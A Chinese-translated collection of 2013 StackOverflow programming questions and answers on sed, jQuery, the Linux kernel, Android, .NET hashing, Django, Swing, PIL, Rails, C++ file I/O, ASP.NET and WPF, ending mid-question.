# StackOverflow 问答 14220000-14220999

# regex - 点不匹配的 Sed 正则表达式和特殊字符 ( \200 )

> ID：14220000
> 
> 赞同：2
> 
> 时间：2013-01-08T16:49:56.880
> 
> 标签：regex, sed

我的问题是正则表达式`.*`似乎与特殊字符不匹配，如下所示：

```
\200
\201
\202
... 
```

（在`emacs`）。

我有一个文件，在分隔符之间有一些值，例如：

```
[a].[b] 
```

我想像这样显示它们：

```
a=b 
```

所以我使用正则表达式：

```
sed 's/^\[\(.*\)\]\.\[\(.*\)\]/\1=\2/g' toto 
```

它可以工作，但是当字符之间的`[]`字符`\200` `sed`不起作用时，就好像`.*`与那些字符不匹配一样。

有人有想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T16:57:00.113

使用 perl：

```
perl -pe 's,^\[([^]]+)\]\.\[([^]]+)\],$1=$2,' toto 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T19:47:51.970

在 Emacs 中：

Mx 查询替换正则表达式

RET

\[\(.*\)] \.\[\(.*\)]

RET

\1=\2

RET

# javascript - 使用jQuery在点击事件上移动背景位置

> ID：14220006
> 
> 赞同：1
> 
> 时间：2013-01-08T16:50:18.697
> 
> 标签：javascript, jquery

我试图在单击某个 div 时移动元素的背景位置，但我似乎无法让它工作。

从文档中我的 jquery 看起来不错？

```
$(this).children('ul li').css('background-position-x','100px'); 
```

这是一个 jsfiddle 演示... [http://jsfiddle.net/shqcu/](http://jsfiddle.net/shqcu/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-08T16:53:23.837

使用[`find()`](http://api.jquery.com/find/)代替`children()`：

```
$(this).find("ul li").css("background-position-x", "100px"); 
```

**演示：http:** [//jsfiddle.net/shqcu/1/](http://jsfiddle.net/shqcu/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T16:56:24.133

您不能单独使用 jQuery 更改元素的背景位置。你需要这个插件[http://keith-wood.name/backgroundPos.html](http://keith-wood.name/backgroundPos.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:10:02.680

```
$(this).css('background-image','url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBFaoYPOnLv_EI4sGOisRrHUGhlHjJp7iY2A4RT1PKXAAPxx3f)'); 
```

# linux - Linux内核：暂停其他task_struct

> ID：14220008
> 
> 赞同：2
> 
> 时间：2013-01-08T16:50:27.813
> 
> 标签：linux, linux-kernel

是否可以暂停与内核当前正在执行的任务不同的任务？要停止当前任务，可以将其设置为非活动并调用计划，但不同的呢？

我目前拥有的：

```
void disable_thread(struct task_struct *tsk) {

    if (tsk->state == TASK_RUNNING) {

        /*
         * A running task - mark it stopped and wait for it to be descheduled
         */

        tsk->state = TASK_INTERRUPTIBLE;
        wait_task_inactive(tsk, TASK_INTERRUPTIBLE);

    } else if (tsk->state == TASK_INTERRUPTIBLE || tsk->state == TASK_UNINTERRUPTIBLE) {

        /*
         *  // TODO: what to do with tasks already waiting for something else?
         */

    } else {

        /*
         * This task's state seems to indicate that it's dead, no need to disable it anymore.
         */
    }
} 
```

停止一个正在运行的线程似乎是这样工作的，但是如果线程已经在等待其他东西（例如等待获取锁），我们能做些什么来防止它重新启动，即使它会获得锁？

我正在实施一项安全功能，如果需要，可以提供更多上下文。

提前致谢。

# android - Android - ArrayAdapter 不工作 - NullPointerException

> ID：14220009
> 
> 赞同：2
> 
> 时间：2013-01-08T16:50:31.327
> 
> 标签：android, listview, android-arrayadapter, android-view

我有一个有列表视图的活动。使用 arrayAdapter 填充列表视图。数组适配器是从 Activity 中调用的。活动将对象的arrayList 传递给适配器。当我执行 Activity 时，我得到空指针异常。请您指导一下需要更正的地方。

```
public class OpenTicketList extends Activity  implements  OnItemClickListener{  
private Bundle basket;
private AdapterTicketList adapterTicketList;
private List<Ticket> openTicketList;
private ListView listView;

@TargetApi(9)
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
    StrictMode.setThreadPolicy(policy);
     Log.i("OpenTicket","on create"); 
     setContentView(R.layout.openticketlist);
     catchBasket(); 
     initialize();  
 }   

//---------------------------------------------------------------------------------------------------------------------
//---To initialize , Bind the widgets and create Tabs
//--------------------------------------------------------------------------------------------------------------------- 
private void initialize() {     
    listView=(ListView)findViewById(R.id.lvOpenTicketList);

    POJO_Ticket pojo_Ticket; 
    ArrayList<POJO_Ticket> ticketArray;
    ticketArray = new ArrayList<POJO_Ticket>(); 

     for(int i=0;i<openTicketList.size();i++){ 
        pojo_Ticket = new POJO_Ticket(openTicketList.get(i));
        ticketArray.add(pojo_Ticket);    
        Log.i("OpenTicket","i = " + Integer.toString(i)); 
     }
        adapterTicketList=new AdapterTicketList(this, ticketArray);
        listView.setAdapter(adapterTicketList);
        listView.setOnItemClickListener(this);    
}
//---------------------------------------------------------------------------------------------------------------------
//---To catch the values from the calling Activity
//---------------------------------------------------------------------------------------------------------------------
private void catchBasket() {
    // TODO Auto-generated method stub
    basket = getIntent().getExtras(); 
    openTicketList = (List<Ticket>) basket.getSerializable("ticket");  
} 
```

## }

```
public class AdapterTicketList extends ArrayAdapter<POJO_Ticket> {
Context context;
ArrayList<POJO_Ticket> ticketArray;
LayoutInflater vi;

public AdapterTicketList(Context context , ArrayList<POJO_Ticket> ticketArray) {    
    super(context, 0, ticketArray );    
    this.ticketArray = new ArrayList<POJO_Ticket>();    
    this.ticketArray.addAll(ticketArray);  
    this.context =context;
    Log.i("AdapterTicketList"," ticket id : " + ticketArray.get(0).getTicketObject().getId()); 
    vi = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);  
    }  

private class ViewHolder {
    TextView tvTicketID;  
    TextView tvCreationHour;  
    TextView tvTableNumber;  
    TextView tvAmount;    
    } 

public View getView(final int position, View convertView, ViewGroup parent) {      
    ViewHolder holder;    
    if (convertView == null) { 
        holder = new ViewHolder();                   
        convertView = vi.inflate(R.layout.rowticket,  null);  
        holder.tvTicketID = (TextView) convertView.findViewById(R.id.tvTicketID); 
        holder.tvCreationHour = (TextView) convertView.findViewById(R.id.tvCreationHour); 
        holder.tvTableNumber = (TextView) convertView.findViewById(R.id.tvTableNumber); 
        holder.tvAmount = (TextView) convertView.findViewById(R.id.tvQuantity);  
        convertView.setTag(holder); 
    } else {
        holder = (ViewHolder) convertView.getTag();  
    }       
    Log.i("AdapterTicketList"," ticket id : " + ticketArray.get(position).getTicketObject().getId()); 
    holder.tvTicketID.setText(ticketArray.get(position).getTicketObject().getId()) ;  
    holder.tvCreationHour.setText(ticketArray.get(position).getTicketObject().getCreationHour()) ;  
    holder.tvTableNumber.setText(ticketArray.get(position).getTicketObject().getTableNumber()) ;   
    holder.tvAmount.setText(Double.toString(ticketArray.get(position).getTicketObject().getTotalAmount())) ; 
    return convertView; 
    } 
```

}

```
 01-08 23:01:55.287: E/AndroidRuntime(7791): FATAL EXCEPTION: main
01-08 23:01:55.287: E/AndroidRuntime(7791): android.content.res.Resources$NotFoundException: String resource ID #0x11
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.content.res.Resources.getText(Resources.java:247)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.TextView.setText(TextView.java:3495)
01-08 23:01:55.287: E/AndroidRuntime(7791): at com.example.restaurent.AdapterTicketList.getView(AdapterTicketList.java:52)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.AbsListView.obtainView(AbsListView.java:2040)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.ListView.makeAndAddView(ListView.java:1772)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.ListView.fillDown(ListView.java:672)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.ListView.fillFromTop(ListView.java:732)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.ListView.layoutChildren(ListView.java:1625)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.AbsListView.onLayout(AbsListView.java:1870)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1652)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.layoutHorizontal(LinearLayout.java:1641)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.onLayout(LinearLayout.java:1417)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1652)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1510)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.onLayout(LinearLayout.java:1415)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.FrameLayout.onLayout(FrameLayout.java:443)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1652)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1510)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.LinearLayout.onLayout(LinearLayout.java:1415)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.widget.FrameLayout.onLayout(FrameLayout.java:443)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.View.layout(View.java:11418)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewGroup.layout(ViewGroup.java:4328)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1489)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2442)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.os.Handler.dispatchMessage(Handler.java:99)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.os.Looper.loop(Looper.java:137)
01-08 23:01:55.287: E/AndroidRuntime(7791): at android.app.ActivityThread.main(ActivityThread.java:4441)
01-08 23:01:55.287: E/AndroidRuntime(7791): at java.lang.reflect.Method.invokeNative(Native Method)
01-08 23:01:55.287: E/AndroidRuntime(7791): at java.lang.reflect.Method.invoke(Method.java:511)
01-08 23:01:55.287: E/AndroidRuntime(7791): at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
01-08 23:01:55.287: E/AndroidRuntime(7791): at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
01-08 23:01:55.287: E/AndroidRuntime(7791): at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T16:58:54.350

看起来`listView`是`null`。设置一个断点`listView.setAdapter(adapterTicketList);`并检查什么是`listView`值。

确保您正在导入正确的 R 文件并清理您的项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:20:49.160

您的列表视图必须为空。您是否在活动中使用了正确的布局文件？

或者你`adapterTicketList`的仍然是空的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T16:57:38.330

您的错误出现在：OpenTicketList.java:67 在我看来，您的“openTicketList”没有任何内容。

很难确定您的问题是什么，但是您正在尝试引用此时尚未实例化的对象。

# .net - 为什么在哈希函数中使用 BlockCopy()？

> ID：14220011
> 
> 赞同：0
> 
> 时间：2013-01-08T16:50:35.827
> 
> 标签：.net, hash-function

试图理解散列函数，但我似乎无法弄清楚为什么在其中使用 BlockCopy。

```
public static string HashPassword(string password)
        {
            if (password == null)
            {
                throw new ArgumentNullException("password");
            }

            // Produce a version 0 (see comment above) password hash.
            byte[] salt;
            byte[] subkey;
            using (var deriveBytes = new Rfc2898DeriveBytes(password, SaltSize, PBKDF2IterCount))
            {
                salt = deriveBytes.Salt;
                subkey = deriveBytes.GetBytes(PBKDF2SubkeyLength);
            }

            byte[] outputBytes = new byte[1 + SaltSize + PBKDF2SubkeyLength];
            Buffer.BlockCopy(salt, 0, outputBytes, 1, SaltSize);
            Buffer.BlockCopy(subkey, 0, outputBytes, 1 + SaltSize, PBKDF2SubkeyLength);
            return Convert.ToBase64String(outputBytes);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T16:53:12.290

[`Buffer.BlockCopy()`](http://msdn.microsoft.com/en-us/library/system.buffer.blockcopy.aspx)是使用原语时进行数组复制的一种更快的方法。

`salt`在您的代码中，它正在从和复制`subkey`到`outputBytes`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T16:55:55.740

此代码连接一个`0`字节（用于版本）、盐和哈希。它相当于：

```
new byte[]{0}.Concat(salt).Concat(subkey).ToArray() 
```

但它更快，留下的垃圾更少。

# python - Python 和 Django 版本问题

> ID：14220016
> 
> 赞同：0
> 
> 时间：2013-01-08T16:50:43.307
> 
> 标签：python, django

有人建议我使用 Python - Django 框架（而不是 php）创建一个网站。
在其文档中，Django 表示它与高于 2.7 的 Python 版本不兼容。
在 Python 下载页面上，可用的最低版本是 2.73。
有什么建议吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T16:54:33.237

Django 1.4 和即将推出的 1.5 将与 Python 2.7.3 一起正常工作。

当 Django 说 Python 2.7 时，它的意思是 2.7.X。您可以使用 Python 2.7 的任何版本，包括 2.7.3。

来自[Django 1.5 常见问题解答](https://docs.djangoproject.com/en/1.5/faq/install/#what-are-django-s-prerequisites)：

> Django 需要 Python，特别是 Python 2.6.5 - 2.7.x。基本的 Django 使用不需要其他 Python 库。Django 1.5 还对 Python 3.2.3 及更高版本提供了实验性支持。

# java - 在保留泛型的同时创建不同的 JTable

> ID：14220017
> 
> 赞同：1
> 
> 时间：2013-01-08T16:50:45.897
> 
> 标签：java, swing, generics, jtable, abstracttablemodel

我有一个使用`Model`由`Item`.

```
public class Model  {
private List<Item>;}

public abstract class Item{}

public class A extends Item{}
public class B extends Item{}
public class C extends Item{} 
```

但是现在我需要创建一个带有一些操作按钮（添加、删除、编辑）的视图，其中 JTable 在中心显示特定项目（A、B、C）。这是我的第一个问题，因为每个特定项目的一个字段都有一个列，所以我需要为每个项目创建一个不同的表。

一个解决方案可能是为每种类型的项目设置一个带有一个表格的卡片布局，但它带来了一个新问题，我的视图如何确定模型中有多少类型的项目而不使用`instanceof()`？

此外，在此之后我还会遇到其他问题，如果我的视图中有 x jtable，我的视图将如何获得该表的模型？我可以为每个项目实现一个这样的接口：

```
public interface MyModel{
AbstractTableModel getModel();
} 
```

但我只能给这个函数一个列表，那么每个项目如何只用它的项目类型填充数据数组？

PS：如果我进一步反思，我有一个额外的问题，我想知道我的操作按钮的侦听器如何简单地知道当前正在修改哪个 JTable，我是否应该将侦听器放在视图中以方便访问卡片布局？

如果需要改进我的问题，请提出要求！不确定这个问题目前是否清楚。

编辑：添加 SSCCE，这是我的目标，但它目前不使用我的程序项目，也没有实现 TableModel/TableModelListener。

```
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.event.TableModelEvent;
import javax.swing.event.TableModelListener;

public class View extends JPanel implements TableModelListener{

    private static final long serialVersionUID = 1L;
    private JTabbedPane card;

    public View() {
        Object rowData[][] = { { "1", "one", "I" }, { "2", "two", "II" }, { "3", "three", "III" } };
        String columnNames[] = { "#", "English", "Roman" };
        Object rowData2[][] = { { "1", "B" } };
        String columnNames2[] = { "#", "type" };
        setLayout(new BorderLayout());
        JPanel actionbutton = new JPanel();
        JButton but = new JButton("fire");
        but.addActionListener(new ButtonListener());
        actionbutton.add(but);
        add(actionbutton,BorderLayout.SOUTH);
        card = new JTabbedPane();
        //something should determine how many type of object in a List<Item> w/o using instanceof
        //should fill jtable with a specific TableModel for each item type
        JTable card1 = new JTable(rowData,columnNames);
        JTable card2 = new JTable(rowData2,columnNames2);
        card.addTab("Item A",new JScrollPane(card1));
        card.addTab("Item B",new JScrollPane(card2));
        add(card,BorderLayout.CENTER);

    }

    private class ButtonListener implements ActionListener{

        @Override
        public void actionPerformed(ActionEvent e) {
             String cmd = e.getActionCommand();
             if ("fire".equals(cmd)) {
                   //do something on the model
             }
        }

    }

    public static void main(String[] args) {
        JFrame f = new JFrame();
        f.setSize(800, 600);
        f.add(new View());
        f.setVisible(true);
    }

    @Override
    public void tableChanged(TableModelEvent e) {
        //update jtable with the model's modification

    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T19:25:58.767

`TableModel`[*支持使用Class Literals 作为 Runtime-Type Tokens 的*](http://docs.oracle.com/javase/tutorial/extra/generics/literals.html)泛型类型。您的`getColumnClass()`（如下）实现定义了表格列可用的类型，并定义了任何非默认[渲染器和编辑器](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editrender)的选择。虽然`DefaultTableModel`提供了相当大的便利，`AbstractTableModel`但只是稍微困难一点，而且更加灵活。作为一个具体示例，这[`EnvTableTest`](https://stackoverflow.com/a/9134371/230513)说明了一个以`Map<String, String>`.

```
@Override
public Class<?> getColumnClass(int columnIndex) {
    // return a token for the specified column
} 
```

# python - 在 Gui 中撤消图像

> ID：14220024
> 
> 赞同：1
> 
> 时间：2013-01-08T16:51:01.293
> 
> 标签：python, python-imaging-library

我有显示图像的 Gui 和几个用于 B&W、镜像等的按钮。
我需要实现一个调用`undo`函数的撤消按钮，很明显，撤消对图像进行的最后一个操作。
我需要使用一个`global`变量 - `history=[]`（空列表）来保存对图像进行的所有操作。我不知道如何做到这一点，我很高兴得到一个方向。
部分代码：

```
def mirror():
    '''Flips the image like a mirror does, left to right'''
    global img
    out = Image.new('L',img.size, 'white')
    out=flip(img)
    img = out  
    display() 

def negate():
    '''Negate the image pixels'''
    global img
    out = Image.new('L',img.size, 'white')
    out=negate_pxls(img)
    img = out  
    display() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T02:30:02.467

这取决于您应用的函数集，如果它们是可逆的，那么它变得非常简单。

`mirror`从实际上沿 y 轴翻转的函数开始。如果要撤消该操作，只需再次沿 y 轴翻转即可。否定图像的工作方式相同。要进行否定，您知道图像类型接受的最大值（例如 255），因此您只需执行 255 - image. 要恢复它，您再次应用 255 - 图像。因此，在这些情况下，您`history`可以简单地使用已应用的函数（因此您只需调用它们来撤消操作）。

现在考虑旋转 90 度。您无法通过旋转更多 90 度来撤消它，而是需要旋转 -90。有了这个新的操作，很明显你`history`需要修改。您实际上想要存储执行的操作列表以及转换的逆操作（并且您将只向用户显示第一个信息）。

让我们再增加一点问题。您现在可以任意旋转，这需要使用插值方法。通常，您不能通过简单地否定度数来通过旋转来撤消它，在应用初始旋转之前，生成的图像将不一样。在您应用 N 个任意旋转然后尝试撤消它们后，情况会变得更糟，离散网格不允许如此完美的撤消。还有一些操作不能简单地撤消，与离散域或连续域无关（腐蚀就是一个简单的例子）。此时您需要区分可逆操作和不可逆操作，这实际上很容易做到。那么问题是当用户执行不可逆操作时，最简单的做法是在修改之前保存当前图像（在内存中或磁盘中）。如果您有足够的内存/磁盘可用，则完全保存图像不是问题。

# ruby-on-rails - 从 Rails 控制台错误创建记录

> ID：14220026
> 
> 赞同：1
> 
> 时间：2013-01-08T16:51:04.383
> 
> 标签：ruby-on-rails

我正在关注 Lynda ruby​​ on rails 教程。

这是我必须运行的代码 "subject = Subject.new(:name => "First Subject", :position => 1, :visible => true)"

这是我的错误信息：

```
ActiveModel::MassAssignmentSecurity::Error: Can't mass-assign protected attributes: name, position, visible
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activemodel-3.2.9/lib/active_model/mass_assignment_security/sanitizer.rb:48:in `process_removed_attributes'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activemodel-3.2.9/lib/active_model/mass_assignment_security/sanitizer.rb:20:in `debug_protected_attribute_removal'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activemodel-3.2.9/lib/active_model/mass_assignment_security/sanitizer.rb:12:in `sanitize'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activemodel-3.2.9/lib/active_model/mass_assignment_security.rb:230:in `sanitize_for_mass_assignment'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activerecord-3.2.9/lib/active_record/attribute_assignment.rb:75:in `assign_attributes'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/activerecord-3.2.9/lib/active_record/base.rb:497:in `initialize'
    from (irb):9:in `new'
    from (irb):9
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/railties-3.2.9/lib/rails/commands/console.rb:47:in `start'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/railties-3.2.9/lib/rails/commands/console.rb:8:in `start'
    from /Users/lexi87/.rvm/gems/ruby-1.9.2-p320/gems/railties-3.2.9/lib/rails/commands.rb:41:in `<top (required)>'
    from script/rails:6:in `require'
    from script/rails:6:in `<main>' 
```

这是我来自模型的subject.rb：

```
class Subject < ActiveRecord::Base
# attr_accessible :title, :body, :name, :position, :visible
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T16:54:20.273

您需要取消注释 attr_accessible，以解释器忽略的 # 字符开头的行

```
 class Subject < ActiveRecord::Base
        attr_accessible :title, :body, :name, :position, :visible
    end 
```

> 无法批量分配受保护的属性：名称、位置、可见

**attr_accessible**指定可以通过批量分配设置的属性列表。

# c++ - 从文件流创建输出文件

> ID：14220029
> 
> 赞同：1
> 
> 时间：2013-01-08T16:51:17.533
> 
> 标签：c++

我对 c++ 相当陌生，是的，这是一项家庭作业。我正在考虑在我的函数中使用 switch 语句而不是 if else 语句。

我正在尝试在处理数据后将从输入文件流读取的信息写入输出文件。

prgram 应该从文件中读取信息，对其进行处理，然后在控制台上显示数据，并将结果写入输出文件，程序应该要求用户输入输入和输出文件的文件名。

我无法让我的程序创建文件。它适用于已经存在的文件。

如果文件不存在，请帮助我让我的程序创建一个文件。

哦，这是在 C++ 中

任何帮助将不胜感激。

我的代码：

```
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include <sstream>

using namespace std;

char getNumber(char l);

int main ()
{
     string s1 = "D:\\Unisa\\Assignment_stuffs\\COS1512\\Assignment\\";
     string inFile, outFile;

     cout << " Please enter the input filename: ";
     cin >> inFile;
     cout << "\nPlease enter the output filename: ";
     cin >> outFile;

     string inFileAdd = s1 + inFile;
     string inFileAdd2 = s1 + outFile;

     ifstream in_stream;
     ofstream out_stream;
     in_stream.open(inFileAdd.c_str(), ios::in);
     if (in_stream.fail())
     {
        cout << "Error!! Input file opening failed.";
        exit(1);
     }
     out_stream.open(inFileAdd2.c_str(), ios::out);
     if (out_stream.fail())
     {
        cout << "Error!! Output file opening failed.";
        exit(1);
     }   

     char next = ' ';
     string letter;

          while (!in_stream.eof()) 
          {
                in_stream.get(next);
                while (next != '\n')
                {
                        cout << next;
                        out_stream.put(next);
                        letter = letter + getNumber(next);
                        in_stream.get(next); 
                }
               cout << " " + letter;
               out_stream << " " + letter << endl;

               letter = "";
               cout << endl;
          }

     in_stream.close();

    return 0;
}

char getNumber(char l)
{
     if ((l == 'A') || (l == 'a') || (l == 'B') || (l == 'b') || (l == 'C') || (l == 'c'))
     {
            return '2';
     }
     else if ((l == 'D') || (l == 'd') || (l == 'E') || (l == 'e') || (l == 'F') || (l == 'f'))
     {
          return '3';
     }
     else if ((l == 'G') || (l == 'g') || (l == 'H') || (l == 'h') || (l == 'I') || (l == 'i'))
     {
          return '4';
     }
     else if ((l == 'J') || (l == 'j') || (l == 'K') || (l == 'k') || (l == 'L') || (l == 'l'))
     {
          return '5';
     }
     else if ((l == 'M') || (l == 'm') || (l == 'N') || (l == 'n') || (l == 'O') || (l == 'o'))
     {
          return '6';
     }
     else if ((l == 'P') || (l == 'p') || (l == 'Q') || (l == 'q') || (l == 'R') || (l == 'r') || (l == 'S') || (l == 's'))
     {
          return '7';
     }
     else if ((l == 'T') || (l == 't') || (l == 'U') || (l == 'u') || (l == 'V') || (l == 'v'))
     {
          return '8';
     }
     else if ((l == 'W') || (l == 'w') || (l == 'X') || (l == 'x') || (l == 'Y') || (l == 'y') || (l == 'Z') || (l == 'z'))
     {
          return '9';
     }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:31:24.250

照 Beta 说的做，首先创建一个**最小的**文件打开和写入程序。让它工作。然后围绕它构建其余所需的功能，在每个步骤中编译和修复错误。如果你能得到这个工作，添加一点你想要的功能给它。如果这不起作用，请查看您正在写入的目录的权限。这在 Visual Studio 中编译，您可能需要在 linux/unix/mac 上包含其他库：

```
#include <fstream>
int main()
{
    std::ofstream file;

    file.open("file.txt");      //open a file

    file<<"Hello file\n";       //write to it

    file.close();           //close it
} 
```

# asp.net - 如何检测 ASP ComboBox 是否为空白.empty

> ID：14220036
> 
> 赞同：0
> 
> 时间：2013-01-08T16:51:39.173
> 
> 标签：asp.net, vb.net, combobox

我有一个 ASP ComboBox，它在页面加载时填充了一个信息列表并设置了一个选定的索引。我希望用户能够在框中键入一个新值并运行一个保存该值的例程。

到目前为止，我已经设法设置它，以便当您运行保存例程时，它可以检测框的文本使用；

```
cboFreeBody.SelectedItem.Text 
```

如果该框加载了“arm”并且我将其更改为“leg”，当我运行我的例程时，它会获取新值并处理它，但是如果我删除“arm”并在运行例程时将其留空，则上面的代码返回'arm'，我希望它返回''。

很抱歉，如果我没有在这里完全解释自己，我对 ASP 和 VB.NET 还比较陌生，所以我可能只是在这里散布无用的信息，但任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:03:26.377

我不确定，但这可能会帮助你..

```
If com_box.SelectedItem = vbEmpty Then
            MsgBox("its empty")
        End If 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:38:09.437

我通常使用 isnullorwhitespace 函数。

```
if string.isnullorwhitespace(cboFreeBody.SelectedItem.Text) then

else

end if 
```

# c# - 将 Win8 商店应用教程改编为 WPF

> ID：14220057
> 
> 赞同：1
> 
> 时间：2013-01-08T16:52:55.610
> 
> 标签：c#, wpf, xaml, user-controls

我正在关注[本教程](http://www.youtube.com/watch?feature=player_embedded&v=m-EqckhJNvI)，该教程解释了如何使用 XAML/C# 在 Visual Studio 中创建拨号。问题是本教程针对的是 Windows 8 商店应用程序。

知道了这一点，我仍然尝试在 WPF 应用程序中使用本教程，该应用程序也将支持以前的操作系统。

我遇到了一些兼容性问题：

1.  `ManipulationMode="All"`不存在，因为本教程的作者为我使用它。它只存在，因为`Manipulation.ManipulationMode="All"`它给了我一个错误“在指定元素上没有激活操作”。我该如何解决？
2.  作者`ManipulationDelta`在元素上设置了属性`grid`，一开始我没有问题......直到我意识到作者的由VS创建的事件/动作代码隐藏使用`ManipulationDeltaRoutedEventArgs e`而不是`ManipulationDeltaEventArgs e`在我的代码隐藏文件中使用。这意味着我不能使用`Position`属性 ( `e.Position`) 来轻松获取用户控件上的鼠标位置。有什么可以替代它的？我不认为它可以被支持，因为它被声明为仅 Win8 ......
3.  在 MVVM 样式的应用程序中，代码隐藏操作将设置在`ViewModel`. 我如何将该操作代码“绑定”到`ManipulationDelta`元素的属性？

提前致谢！

附言; 我的和作者的 VS 版本都是 2012，所以这不是问题。

更新：这是部分完成的代码：

XAML：

```
//Manipulation.ManipulationMode="All" => ERROR 'Manipulation is not active on the specified element'
<Grid Manipulation.ManipulationMode="All" ManipulationDelta="Grid_ManipulationDelta_1">
    <Ellipse Fill="#FF7171E6" Margin="30"/>
    <Grid>
        <Grid.RenderTransform>
            <RotateTransform CenterX="225" CenterY="225" Angle="{Binding Angle}"/>
        </Grid.RenderTransform>
        <Ellipse Fill="White" Height="100" VerticalAlignment="Top" Margin="50" Width="100"/>

    </Grid>
</Grid> 
```

代码隐藏：

```
public partial class dial : UserControl, INotifyPropertyChanged
{
    private int m_Amount;
    public int Amount {...}

    private double m_Angle;
    public double Angle {...}

    public dial()
    {
        InitializeComponent();
        this.DataContext = this;
    }

    private void Grid_ManipulationDelta_1(object sender, ManipulationDeltaEventArgs e)
    {
        this.Angle = GetAngle(e.Position, this.RenderSize); //e.Position doesn't exist in ManipulationDeltaEventArgs...
        this.Amount = (int)(this.Angle / 360 * 100);
    }

    public enum Quadrants : int { nw = 2, ne = 1, sw = 4, se = 3 }
    private double GetAngle(Point touchPoint, Size circleSize)
    {
